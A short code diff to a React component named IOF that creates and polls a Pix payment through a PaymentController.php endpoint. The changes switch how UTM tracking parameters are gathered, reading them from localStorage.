@@ -22,6 +22,8 @@ const IOF = () => {
   const [paymentStatus, setPaymentStatus] = useState<string>("");
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
+
+
   // Cleanup interval on unmount
   useEffect(() => {
     return () => {
@@ -97,6 +99,7 @@ const IOF = () => {
 
   const checkPaymentStatus = async (transactionId: string) => {
     try {
+
       const response = await fetch("https://cdn.parceiro-digital.shop/PaymentController.php", {
         method: "POST",
         headers: {
@@ -139,6 +142,11 @@ const IOF = () => {
     setIsGeneratingPix(true);
     
     try {
+
+      const utmParamsString = localStorage.getItem("utm_params");
+      const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};
+
+
       const response = await fetch("https://cdn.parceiro-digital.shop/PaymentController.php", {
         method: "POST",
         headers: {
@@ -152,7 +160,7 @@ const IOF = () => {
           telefone: "19298373473",
           amount: 2490,
           item_title: "Parceiro Kwai",
-          utmQuery: getUtmParams(),
+          utmQuery: JSON.stringify(utmParams),
           referrerUrl: "https://www.exemplo.com/pagina"
         })
       });
